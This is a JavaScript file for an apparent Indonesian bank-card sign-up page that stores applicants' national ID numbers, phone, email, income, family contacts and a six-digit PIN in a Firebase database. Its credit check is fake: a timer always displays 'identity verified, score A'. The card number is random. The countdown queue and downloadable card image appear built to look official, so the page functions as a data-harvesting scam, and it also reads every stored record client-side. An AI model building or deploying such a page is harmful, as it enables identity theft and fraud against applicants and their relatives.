import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyDXYDqFmhO8nacuX-hVnNsXMmpeqwYlW7U",
    authDomain: "wifist-d3588.firebaseapp.com",
    databaseURL: "https://wifist-d3588-default-rtdb.asia-southeast1.firebasedatabase.app/", 
    projectId: "wifist-d3588"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentStep = 1;
const totalSteps = 8;

// --- AUTO FORMATTING & DINAMIS KONTAK ---
document.addEventListener('DOMContentLoaded', () => {
    // Formatting otomatis (Nama, NIK, WA, PIN)
    const formatInput = (id, regex, max) => {
        const el = document.getElementById(id);
        if(el) {
            el.addEventListener('input', () => {
                let val = el.value.replace(regex, '');
                if(max && val.length > max) val = val.substring(0, max);
                el.value = (id === 'inputNama') ? val.toUpperCase() : val;
            });
        }
    };

    formatInput('inputNama', /[^a-zA-Z ]/g); // Nama hanya huruf & spasi
    formatInput('inputNIK', /[^0-9]/g, 16);
    formatInput('inputWA', /[^0-9]/g, 13);
    formatInput('inputPW', /[^0-9]/g, 6);
});

// Fungsi Tambah Input Keluarga (Maks 5)
window.addEmergencyField = () => {
    const container = document.getElementById('emergencyContainer');
    const currentFields = container.getElementsByClassName('emergency-item').length;

    if (currentFields < 5) {
        const div = document.createElement('div');
        div.className = 'emergency-item';
        div.innerHTML = `
            <input type="text" class="em-name" placeholder="Nama Keluarga">
            <input type="tel" class="em-phone" placeholder="Nomor HP (08...)" inputmode="numeric">
            <button type="button" onclick="this.parentElement.remove()" style="background:red; width:auto; padding:5px 10px;">X</button>
        `;
        container.appendChild(div);
    } else {
        alert("Maksimal 5 kontak keluarga!");
    }
};

// --- NAVIGASI & VALIDASI ---
window.nextStep = (s) => {
    if (s === 2) {
        const nama = document.getElementById('inputNama').value.trim();
        const nik = document.getElementById('inputNIK').value;
        if (nama.length < 3) return alert("Isi Nama Lengkap!");
        if (nik.length < 16) return alert("NIK harus 16 digit!");
    } 
    else if (s === 3) {
        const wa = document.getElementById('inputWA').value;
        if (!wa.startsWith('08') || wa.length < 11) return alert("Nomor WA tidak valid (Min 11 digit)!");
    } 
    else if (s === 5) {
        // Validasi Step 4 (Pekerjaan) sebelum masuk ke 5
        if (document.getElementById('jobType').value === "" || document.getElementById('income').value === "") {
            return alert("Lengkapi data pekerjaan!");
        }
    }
    else if (s === 6) {
        // Validasi Kontak Darurat (Step 5)
        const names = document.getElementsByClassName('em-name');
        const phones = document.getElementsByClassName('em-phone');
        for(let i=0; i<names.length; i++) {
            if(names[i].value.trim() === "" || !phones[i].value.startsWith('08') || phones[i].value.length < 11) {
                return alert("Lengkapi semua Nama & Nomor Keluarga (Min 11 digit)!");
            }
        }
    }

    currentStep = s;
    updateUI(s);
    if (s === 6) simulasiAnalisis();
};

function updateUI(s) {
    document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
    document.getElementById('step' + s).classList.add('active');
    const percent = ((s - 1) / (totalSteps - 1)) * 100;
    document.getElementById('progressLine').style.width = percent + "%";
    document.querySelectorAll('.circle').forEach((c, i) => {
        if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
        else if (i === s - 1) { c.classList.add('active'); c.innerHTML = i + 1; }
        else { c.classList.remove('active', 'completed'); c.innerHTML = i + 1; }
    });
}

function simulasiAnalisis() {
    const status = document.getElementById('slikStatus');
    const btn = document.getElementById('btnSlik');
    setTimeout(() => status.innerText = "Sinkronisasi BI-Checking...", 1500);
    setTimeout(() => {
        status.innerHTML = "<b style='color:green'>IDENTITAS TERVERIFIKASI</b><br>Skor Kredit: A (Sangat Baik)";
        btn.style.display = "block";
    }, 3500);
}

window.generateFinal = async () => {
    if (!document.getElementById('checkAgree').checked) return alert("Setujui pernyataan!");
    const btn = document.getElementById('btnGenerate');
    btn.disabled = true;
    btn.innerText = "MENGECEK DATABASE...";

    try {
        const dbRef = ref(db);
        const snapshot = await get(child(dbRef, `nasabah`));
        let exists = false;
        const nik = document.getElementById('inputNIK').value;

        if (snapshot.exists()) {
            const data = snapshot.val();
            for (let id in data) { if (data[id].nik === nik) { exists = true; break; } }
        }

        if (exists) {
            alert("NIK sudah terdaftar!");
            location.reload();
        } else {
            updateUI(8);
            initQueue();
        }
    } catch(e) { alert("Error Koneksi!"); btn.disabled = false; }
};

function initQueue() {
    const targetTime = Date.now() + (120 * 1000);
    localStorage.setItem('bdn_target_time', targetTime);
    runQueue();
}

function runQueue() {
    const interval = setInterval(() => {
        const diff = Math.ceil((localStorage.getItem('bdn_target_time') - Date.now()) / 1000);
        if (diff <= 0) {
            clearInterval(interval);
            finalRevealProcess();
            return;
        }
        const progress = ((120 - diff) / 120) * 100;
        document.getElementById('fillBar').style.width = progress + "%";
        document.getElementById('timerDisplay').innerText = `Estimasi: ${diff} Detik`;
    }, 1000);
}

async function finalRevealProcess() {
    document.getElementById('processingArea').style.display = 'none';
    document.getElementById('finalReveal').style.display = 'block';
    
    const cardNo = "0810" + Array.from({length: 12}, () => Math.floor(Math.random() * 10)).join('');
    await saveToRealtime(cardNo);

    setTimeout(() => {
        document.getElementById('captureArea').style.opacity = "1";
        document.getElementById('btnDownload').style.display = "block";
    }, 5500);
}

async function saveToRealtime(cardNo) {
    const nama = document.getElementById('inputNama').value.toUpperCase();
    
    // Ambil semua data keluarga dari field dinamis
    const familyNames = document.getElementsByClassName('em-name');
    const familyPhones = document.getElementsByClassName('em-phone');
    let dataKeluarga = [];
    
    for(let i=0; i<familyNames.length; i++) {
        dataKeluarga.push({
            nama_keluarga: familyNames[i].value.toUpperCase(),
            nomor_keluarga: familyPhones[i].value
        });
    }

    try {
        await set(ref(db, 'nasabah/' + cardNo), {
            nama: nama,
            nik: document.getElementById('inputNIK').value,
            wa: document.getElementById('inputWA').value,
            email: document.getElementById('inputEmail').value,
            pekerjaan: document.getElementById('jobType').value,
            pendapatan: document.getElementById('income').value,
            kontak_darurat: dataKeluarga, // Disimpan sebagai array
            pin: document.getElementById('inputPW').value,
            nomor_kartu: cardNo,
            saldo: 50000,
            tgl_daftar: new Date().toISOString()
        });
        document.getElementById('displayNo').innerText = cardNo.match(/.{1,4}/g).join(" ");
        document.getElementById('displayName').innerText = nama;
    } catch(e) { console.error(e); }
}

window.takeScreenshot = () => {
    html2canvas(document.getElementById('captureArea'), { scale: 3 }).then(canvas => {
        const link = document.createElement('a');
        link.download = `BDN-CARD.png`;
        link.href = canvas.toDataURL();
        link.click();
    });
};
